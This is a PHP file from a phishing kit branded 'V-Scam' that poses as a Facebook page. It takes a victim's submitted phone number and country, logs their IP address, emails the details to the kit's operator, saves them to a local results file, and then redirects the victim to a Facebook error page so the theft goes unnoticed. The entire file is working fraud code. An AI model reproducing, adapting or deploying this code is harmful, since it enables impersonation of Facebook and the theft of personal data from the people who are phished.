<?php
/* 
-                                                                                   
 ____      ____          ______        _____         _____        ______  _______   
|    |    |    |     ___|\     \   ___|\    \    ___|\    \      |      \/       \  
|    |    |    |    |    |\     \ /    /\    \  /    /\    \    /          /\     \ 
|    |    |    |    |    |/____/||    |  |    ||    |  |    |  /     /\   / /\     |
|    |    |    | ___|    \|   | ||    |  |____||    |__|    | /     /\ \_/ / /    /|
|    |    |    ||    \    \___|/ |    |   ____ |    .--.    ||     |  \|_|/ /    / |
|\    \  /    /||    |\     \    |    |  |    ||    |  |    ||     |       |    |  |
| \ ___\/___ / ||\ ___\|_____|   |\ ___\/    /||____|  |____||\____\       |____|  /
 \ |   ||   | / | |    |     |   | |   /____/ ||    |  |    || |    |      |    | / 
  \|___||___|/   \|____|_____|    \|___|    | /|____|  |____| \|____|      |____|/  
    \(    )/        \(    )/        \( |____|/   \(      )/      \(          )/     
     '    '          '    '          '   )/       '      '        '          '      
                                         '                                          */
#------------------------------[VSCAM - DETAILS]------------------------------#
  error_reporting(0);
  
$ip = getenv("REMOTE_ADDR");
include 'email.php';
$message .= "#--------------------------[ FACEBOOK PHONE ]--------------------------#\n";
$message .= "PHONE NUMBER   : ".$_POST['phone']."\n";
$message .= "COUNTRY        : ".$_POST['location']."\n";
$message .= "#--------------------------[ IP INFO ]--------------------------#\n";
$message .= "IP ADDRESS     : ".$ip."\n";
$message .= "#--------------------------[ BY V-SCAM ]--------------------------#\n";
$subject = "♊ NEW LINKED PHONE // ".$_POST['phone']." // ".$_POST['location']." // $ip";
$headers = "From: V-Scam ♊ <news@v-scam.cash>";
mail($SEND,$subject,$message,$headers);

$file = fopen("result.txt", 'a');
fwrite($file, $message);
header("location: https://m.facebook.com/error");
?>